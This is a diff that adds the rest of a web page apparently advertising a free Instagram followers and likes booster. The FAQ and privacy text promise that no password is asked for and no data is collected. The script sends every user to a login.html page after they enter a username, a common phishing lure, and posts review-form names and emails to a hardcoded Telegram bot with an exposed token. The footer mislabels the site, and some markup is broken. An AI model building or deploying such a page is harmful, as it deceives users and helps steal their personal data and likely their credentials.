@@ -637,4 +637,183 @@
         </div>
         <div class="input-group">
             <label for="commentText">Comment</label>
-            <textarea id="commentText" class="input-field" rows="4" placeholder="Write your review here..." required></texta
+            <textarea id="commentText" class="input-field" rows="4" placeholder="Write your review here..." required></texta        </div>
+        <button type="submit" class="btn">Submit Review</button>
+    </form>
+</div>
+
+<div class="faq-section" id="faq">
+    <div style="height: 30px;"></div>
+    <h3>Frequently Asked Questions</h3>
+    <div class="faq-item">
+        <h4 onclick="toggleFAQ(this)">Is this website safe to use?</h4>
+        <p>Yes, this website is completely safe. We do not ask for your password or any sensitive information. It's a fun and harmless tool.</p>
+    </div>
+    <div class="faq-item">
+        <h4 onclick="toggleFAQ(this)">How long does it take to get followers/likes?</h4>
+        <p>Our booster tool simulates the process in just a few seconds. The results are instant (but fake, for fun!).</p>
+    </div>
+    <div class="faq-item">
+        <h4 onclick="toggleFAQ(this)">Do I need to pay for this service?</h4>
+        <p>No, our service is completely free! You can generate followers and likes as many times as you like without any cost.</p>
+    </div>
+    <div class="faq-item">
+        <h4 onclick="toggleFAQ(this)">Will this get my Instagram account banned?</h4>
+        <p>No, absolutely not. Since this is a fake tool for entertainment purposes, there is no risk to your Instagram account.</p>
+    </div>
+</div>
+
+<div class="popup-page" id="terms-page" style="display:none;">
+    <h3>Terms of Service</h3>
+    <p>This is a demonstration page. The service offered on this website is for entertainment purposes only and does not provide real Instagram followers or likes. By using this website, you agree to these terms.</p>
+    <a href="#" onclick="hideAllPopups()">Close</a>
+</div>
+
+<div class="popup-page" id="privacy-page" style="display:none;">
+    <h3>Privacy Policy</h3>
+    <p>This is a demonstration page. We do not collect or store any personal information from you. Any data entered is not saved or used for any purpose. This policy is for informational purposes only.</p>
+    <a href="#" onclick="hideAllPopups()">Close</a>
+</div>
+
+<div class="review-success-popup" id="reviewSuccessPopup">
+    <i class="fas fa-times close-btn" onclick="hideAllPopups()"></i>
+    <div class="review-success-content">
+        <i class="fas fa-check-circle success-icon"></i>
+        <h3>Thank you for your valuable feedback!</h3>
+        <p>Your review is sent successfully. We regularly check and act on all reviews to improve our services.</p>
+        <button class="btn" onclick="hideAllPopups()">Okay</button>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-links">
+        <a href="#about">About Us</a> |
+        <a href="#" onclick="showPopup('terms-page')">Terms of Service</a> |
+        <a href="#" onclick="showPopup('privacy-page')">Privacy Policy</a>
+    </div>
+    <div style="margin-top: 10px;">
+        © 2025 URL Shortener | Developed with <span style="color: red;">♥</span> by Divyansh - Deewana
+    </div>
+</footer>
+
+<script>
+    // --- Telegram Bot Integration ---
+    const TELEGRAM_BOT_TOKEN = '8106988001:AAFaoV6ya8Rq7Y_015YNr_QZf17Hj1IJwmA'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = '2031314339';     // Replace with your chat ID
+
+    async function sendToTelegram(message) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.error('Telegram bot token or chat ID is not configured.');
+            return;
+        }
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+
+        try {
+            await fetch(`${url}?${params.toString()}`);
+            console.log('Message sent to Telegram successfully!');
+        } catch (error) {
+            console.error('Failed to send message to Telegram:', error);
+        }
+    }
+
+    window.addEventListener('load', () => {
+        document.body.classList.add('loaded');
+    });
+
+    let selectedOption = '';
+    const icons = ['fab fa-instagram', 'fas fa-heart', 'fas fa-users'];
+    let currentIconIndex = 0;
+    const dynamicIconElement = document.getElementById('dynamicIcon');
+    const sideMenu = document.getElementById('sideMenu');
+    const overlay = document.getElementById('overlay');
+    const generateButton = document.getElementById('generateButton');
+    const reviewSuccessPopup = document.getElementById('reviewSuccessPopup');
+    const popupPages = document.querySelectorAll('.popup-page');
+
+    setInterval(() => {
+        dynamicIconElement.className = `dynamic-icon ${icons[currentIconIndex]}`;
+        currentIconIndex = (currentIconIndex + 1) % icons.length;
+    }, 1000);
+
+    function toggleMenu() {
+        sideMenu.classList.toggle('open');
+        overlay.classList.toggle('active');
+    }
+
+    function selectOption(option) {
+        selectedOption = option;
+        const optionBoxes = document.querySelectorAll('.option-box');
+        optionBoxes.forEach(box => box.classList.remove('selected'));
+        document.querySelector(`.option-box[onclick*="${option}"]`).classList.add('selected');
+        document.getElementById('quantity-group').style.display = 'block';
+
+        updateButtonText();
+    }
+
+    function updateButtonText() {
+        if (selectedOption === 'followers') {
+            generateButton.innerText = `Get Followers`;
+        } else if (selectedOption === 'likes') {
+            generateButton.innerText = `Get Likes`;
+        }
+    }
+
+    function generate() {
+        const username = document.getElementById('username').value;
+        
+        if (!username || !selectedOption) {
+            alert('Please enter a username and select an option.');
+            return;
+        }
+        
+        // Redirect to the login page regardless of the option
+        window.location.href = 'login.html';
+    }
+
+    function toggleFAQ(element) {
+        const parent = element.parentElement;
+        parent.classList.toggle('active');
+    }
+
+    function showPopup(id) {
+        hideAllPopups();
+        document.getElementById(id).style.display = 'block';
+        overlay.classList.add('active');
+    }
+
+    function hideAllPopups() {
+        reviewSuccessPopup.style.display = 'none';
+        popupPages.forEach(popup => popup.style.display = 'none');
+        overlay.classList.remove('active');
+        if (sideMenu.classList.contains('open')) {
+            sideMenu.classList.remove('open');
+        }
+    }
+
+    document.getElementById('commentForm').addEventListener('submit', async function(event) {
+        event.preventDefault();
+        
+        const name = document.getElementById('commentName').value;
+        const email = document.getElementById('commentEmail').value;
+        const comment = document.getElementById('commentText').value;
+
+        if (name && email && comment) {
+            const telegramMessage = `<b>New Comment Received!</b>\n\n<b>Name:</b> ${name}\n<b>Email:</b> ${email}\n<b>Comment:</b> ${comment}`;
+            await sendToTelegram(telegramMessage);
+            
+            showPopup('reviewSuccessPopup');
+            
+            this.reset();
+        } else {
+            alert('Please fill out all the fields.');
+        }
+    });
+</script>
+</body>
+</html>
